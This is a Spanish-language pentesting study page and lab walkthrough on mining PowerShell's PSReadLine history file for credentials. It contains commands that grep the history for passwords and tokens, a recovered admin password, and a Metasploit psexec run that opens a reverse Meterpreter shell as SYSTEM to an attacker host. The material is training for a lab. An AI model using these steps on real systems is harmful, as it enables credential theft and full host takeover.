
# Powershell History

## <mark style="color:purple;">Introducción</mark>

El historial de PowerShell es una fuente valiosa de información durante pruebas de penetración, ya que puede contener contraseñas, rutas de acceso, nombres de servidores y otros datos sensibles escritos directamente en la línea de comandos.

#### ¿Dónde se almacena el historial?

PowerShell utiliza el módulo **PSReadLine** para gestionar el historial de comandos. A diferencia del comando `Get-History` que solo muestra los comandos de la sesión actual, el historial de PSReadLine **persiste entre sesiones**.

La ubicación exacta del archivo de historial es:

```powershell
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

O usando la variable de usuario:

```powershell
$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## <mark style="color:purple;">Comandos</mark>

### **1. Ver todo el historial (recomendado)**

```powershell
# Método más directo: leer el archivo de historial
Get-Content (Get-PSReadLineOption).HistorySavePath
```

Este comando utiliza `Get-PSReadLineOption` para obtener la ruta exacta del archivo de historial y luego lo muestra con `Get-Content`.

### **2. Ver solo las últimas líneas**

```powershell
# Últimos 20 comandos
Get-Content (Get-PSReadLineOption).HistorySavePath -Tail 20

# Últimos 50 comandos
Get-Content (Get-PSReadLineOption).HistorySavePath -Last 50
```

### **3. Comandos específicos**

```powershell
# Buscar comandos que contengan "password"
Get-Content (Get-PSReadLineOption).HistorySavePath | Select-String "password"

# Buscar varios patrones
Get-Content (Get-PSReadLineOption).HistorySavePath | Select-String "password|credential|secret|key|token"
```

### **4. Abrir el archivo directamente**

```powershell
# Abrir en el editor por defecto
Invoke-Item (Get-PSReadLineOption).HistorySavePath

# O con notepad
notepad (Get-PSReadLineOption).HistorySavePath
```

***

## <mark style="color:purple;">Lab: Powershell History</mark>

Tu tarea consiste en investigar el historial de comandos del terminal de PowerShell para detectar escalada de privilegios.

En este entorno de laboratorio, se le proporcionará acceso a la interfaz gráfica de usuario (GUI) de una máquina Kali de ataque y de una máquina Windows de destino.

**Objetivo:** Obtener acceso a una sesión de Meterpreter con privilegios de administrador.

#### Lab

En este laboratorio podemos alternar fácilmente entre la máquina Kali y la máquina Windows objetivo y tenemos todos los scripts disponibles en el escritorio de la máquina Windows:

<figure><img src="/files/tVlf9j9GOVAbR4YcYCSj" alt=""><figcaption></figcaption></figure>

### Búsqueda manual

Observamos que hay almacenada una contraseña de administrador:

```powershell
PS C:\Users\student> Get-Content (Get-PSReadLineOption).HistorySavePath

<----SNIP---->

wmic service where started=true get name, startname
schtasks /query /fo LIST /v
netstat -an | find "LISTEN"
$username = 'administrator'
$password = convertto-securestring "alita_123321" -asplaintext -force
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

### Runas como admin

Con estas credenciales almacenadas podemos usar runas para loguearnos sin introducir una contraseña:

<pre class="language-powershell"><code class="lang-powershell"><strong>runas.exe /user:administrator cmd
</strong></code></pre>

<figure><img src="/files/mfpJpIOiDdl8VV1qqKsk" alt=""><figcaption></figcaption></figure>

### Acceso a la flag

```powershell
C:\Windows\system32>cd C:/Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

10/29/2020  11:27 AM    <DIR>          .
10/29/2020  11:27 AM    <DIR>          ..
10/29/2020  11:28 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,497,715,712 bytes free

C:\Users\Administrator\Desktop>type flag.txt
f67c2bcbfcfa30fccb36f72d********
```

### Meterpreter: PSExec

Para ganar la sesión de Meterpreter desde Kali usaremos `PSExec` o la técnica del HTA Server que vimos anterriormente:

{% content-ref url="/pages/gHaF6vUed8SWp2pWQHGA#explotacion-desde-kali-hta-server" %}
[Windows Privilege Escalation Scripts](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/windows-privilege-escalation/windows-privilege-escalation-scripts.md#explotacion-desde-kali-hta-server)
{% endcontent-ref %}

```bash
msfconsole
use exploit/windows/smb/psexec
RHOSTS 10.2.16.21
set SMBUser administrator
set SMBPass alita_123321
set payload /windows/x64/meterpreter/reverse_tcp
exploit

[*] Started reverse TCP handler on 10.10.37.11:4444 
[*] 10.2.16.21:445 - Connecting to the server...
[*] 10.2.16.21:445 - Authenticating to 10.2.16.21:445 as user 'administrator'...
[*] 10.2.16.21:445 - Selecting PowerShell target
[*] 10.2.16.21:445 - Executing the payload...
[+] 10.2.16.21:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201283 bytes) to 10.2.16.21
[*] Meterpreter session 1 opened (10.10.37.11:4444 -> 10.2.16.21:49759) at 2026-03-31 13:55:07 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
